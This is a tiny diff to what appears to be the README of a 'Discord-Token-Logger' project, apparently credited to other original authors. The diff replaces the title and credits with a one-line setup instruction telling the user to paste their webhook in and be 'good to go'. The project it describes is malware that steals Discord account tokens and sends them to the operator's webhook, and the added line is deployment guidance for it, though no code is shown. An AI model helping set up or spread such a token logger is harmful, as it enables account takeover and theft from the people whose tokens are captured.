@@ -1,2 +1,1 @@
-# Discord-Token-Logger
-This is english vers credits to og owners
+Basically just put ur webhook where it says enter webhook name, and ur good to go 🗿
